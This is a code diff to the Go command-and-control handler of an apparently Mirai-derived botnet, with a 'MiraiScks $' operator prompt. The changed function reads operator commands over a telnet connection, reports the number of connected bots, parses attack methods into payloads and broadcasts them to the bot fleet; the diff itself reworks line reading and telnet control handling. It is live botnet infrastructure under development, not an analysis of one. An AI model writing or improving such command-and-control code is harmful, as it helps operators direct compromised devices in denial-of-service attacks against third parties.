@@ -1,32 +1,30 @@
 package cnc
 
 import (
+	"bufio"
 	"bytes"
 	"fmt"
 	"net"
+	"net/textproto"
 	"strings"
 )
 
 func (h *Handler) RunConnHandler(conn net.Conn) {
 	defer conn.Close()
 
-	var b = make([]byte, 1024)
+	// var b = make([]byte, 1024)
 
 	for {
-		conn.Write([]byte("MiraiScks $ "))
+		conn.Write([]byte("\n\rMiraiScks $ "))
 
-		n, err := conn.Read(b)
+		r := bufio.NewReader(conn)
+		cmd, err := textproto.NewReader(r).ReadLine()
 		if err != nil {
-			if err.Error() == "EOF" {
-				return
-			}
-
+			return
 		}
 
-		cmd := string(b[:n])
-
 		// ctrl + c
-		if bytes.EqualFold([]byte(cmd), []byte{255, 244, 255, 253, 6}) {
+		if bytes.EqualFold([]byte(cmd), []byte{255, 244, 255, 253, 6}) || bytes.Contains([]byte(cmd), []byte{255, 248, 3}) {
 			return
 		}
 
@@ -36,16 +34,16 @@ func (h *Handler) RunConnHandler(conn net.Conn) {
 		if strings.Contains(cmd, "bots") {
 			var final string
 
-			final += fmt.Sprintf("Total: %d\n", h.services.BotCache.Len())
+			final += fmt.Sprintf("Total: %d\r", h.services.BotCache.Len())
 
 			final += h.services.Cmds.GetBots()
-			conn.Write([]byte(final))
+			conn.Write([]byte(final + "\r"))
 			continue
 		}
 
 		payloadString, isMethod, err := h.services.Parser.Parse(cmd)
 		if err != nil {
-			conn.Write([]byte(err.Error() + "\n"))
+			conn.Write([]byte(err.Error() + "\r"))
 			continue
 		}
 
@@ -55,7 +53,7 @@ func (h *Handler) RunConnHandler(conn net.Conn) {
 
 			h.services.Broadcaster.Broadcast(payload)
 
-			conn.Write([]byte("sent\n"))
+			conn.Write([]byte("sent\r"))
 		}
 
 		// h.services.Parser.Parse()
